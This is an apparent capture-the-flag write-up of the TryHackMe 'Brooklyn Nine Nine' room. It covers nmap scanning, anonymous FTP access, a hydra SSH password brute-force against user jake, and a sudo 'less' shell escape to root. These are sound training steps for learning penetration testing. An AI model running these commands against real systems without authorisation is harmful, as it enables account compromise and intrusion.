---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/brooklyn-nine-nine/","tags":["CTF","write-up"]}
---


![Pasted image 20250109202038.png|300](/img/user/attachments/Pasted%20image%2020250109202038.png)

---

> [!INFO] Info about Brooklyn Nine Nine
>  This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance
## Port scan
Perform a quick general scan on all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 61
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

---
# Enumeration
Perform a deep scan with common scripts only on ports we are interested in.
```shell
sudo nmap TARGET_IP -sCV -p 21,22,80 -oN nmap_enum
```
## OS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Ubuntu
## Port 22 - SSH
tcp open  ssh     **OpenSSH 7.6p1** Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
## Port 21 - FTP
/tcp open  ftp     **vsftpd 3.0.3**
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.6.6.196
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|End of status
| ftp-anon: **Anonymous** FTP login allowed (FTP code 230)
|-rw-r--r--    1 0        0             119 May 17  2020 **note_to_jake.txt**
### Anonymous
Login and get the note
```shell
ftp IP
ftp
get note_to_jake.txt 
```

The note:
![Pasted image 20250109202845.png](/img/user/attachments/Pasted%20image%2020250109202845.png)
Take note of possible usernames

> [!tip] Important
> The Jake's password is weak.

## Port 80 - Apache
tcp open  http    **Apache** httpd **2.4.29** ((Ubuntu))
![Pasted image 20250109203331.png](/img/user/attachments/Pasted%20image%2020250109203331.png)

Checking the source code I found something.
> [!tip] Hint
> ![Pasted image 20250109203618.png](/img/user/attachments/Pasted%20image%2020250109203618.png)
### Fuzz
Nothing found

---
# Exploitation
## SSH exploit
Try brute force to SSH based on the fact that the *jake*'s password is weak.
```shell
hydra -f -V -t 64 -l jake -P /usr/share/wordlists/rockyou.txt 10.10.215.156 ssh
```
![Pasted image 20250109204816.png](/img/user/attachments/Pasted%20image%2020250109204816.png)

We can log in as *jake*

> [!check] User flag
> ![Pasted image 20250109205942.png](/img/user/attachments/Pasted%20image%2020250109205942.png)

---
# Privilege escalation
## sudo -l
Check
```shell
sudo -l
```
![Pasted image 20250109205551.png](/img/user/attachments/Pasted%20image%2020250109205551.png)

We can execute *less*, go to *gtfobins* and we can leverage this executing.
```shell
sudo less /etc/profile
!/bin/sh
```


> [!check] Root flag
> ![Pasted image 20250109210030.png](/img/user/attachments/Pasted%20image%2020250109210030.png)

---
